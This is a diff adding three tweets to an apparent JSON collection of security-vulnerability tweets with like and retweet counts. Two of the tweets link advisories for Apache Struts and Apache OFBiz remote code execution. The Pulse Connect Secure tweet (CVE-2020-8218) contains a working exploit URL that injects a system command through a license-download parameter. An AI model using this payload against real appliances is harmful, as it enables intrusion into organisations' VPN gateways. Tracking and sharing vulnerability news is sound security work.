@@ -26,6 +26,19 @@
 }
 {
     "expanded_url": [
+        "https://www.gosecure.net/blog/2020/08/26/forget-your-perimeter-rce-in-pulse-connect-secure/"
+    ],
+    "tweetfavorites": 367,
+    "tweetquotes": 6,
+    "tweetreplies": 1,
+    "tweetretweets": 187,
+    "tweettext": "CVE-2020-8218 Pulse Connect Secure post-auth RCE\n\nhttps://x.x.x.x/dana-admin/license/downloadlicenses.cgi?cmd=download&amp;txtVLSAuthCode=whatever -n '($x=\"ls /\",system$x); #' -e /data/runtime/tmp/tt/setcookie.thtml.ttc\n\nhttps://t.co/4HZaKORE6s",
+    "tweettime": "2020-08-28, 05:34:56",
+    "tweeturl": "https://twitter.com/chybeta/status/1299218892657586176",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
         "https://github.com/maxpl0it/CVE-2019-17026-Exploit/"
     ],
     "tweetfavorites": 321,
@@ -172,6 +185,32 @@
     "tweettime": "2020-08-15, 16:40:21",
     "tweeturl": "https://twitter.com/ptracesecurity/status/1294675304871534592",
     "username": "ptracesecurity"
+}
+{
+    "expanded_url": [
+        "https://cwiki.apache.org/confluence/display/WW/S2-059"
+    ],
+    "tweetfavorites": 237,
+    "tweetquotes": 5,
+    "tweetreplies": 4,
+    "tweetretweets": 102,
+    "tweettext": "Apache Struts RCE: S2-059 / CVE-2019-0230\n\nhttps://t.co/m6z3jqRsj4\n\nForced double OGNL evaluation, when evaluated on raw user input in tag attributes, may lead to remote code execution. https://t.co/6JwZCozTeB",
+    "tweettime": "2020-08-13, 17:41:35",
+    "tweeturl": "https://twitter.com/chybeta/status/1293965938388119553",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz"
+    ],
+    "tweetfavorites": 114,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 46,
+    "tweettext": "CVE-2020-9496 Apache OFBiz PRE-AUTH RCE \n\nadvisory: https://t.co/rsmAgGmzoa https://t.co/ChaSFoeXO8",
+    "tweettime": "2020-08-13, 10:15:02",
+    "tweeturl": "https://twitter.com/chybeta/status/1293853562489810946",
+    "username": "chybeta"
 }
 {
     "tweetfavorites": 0,
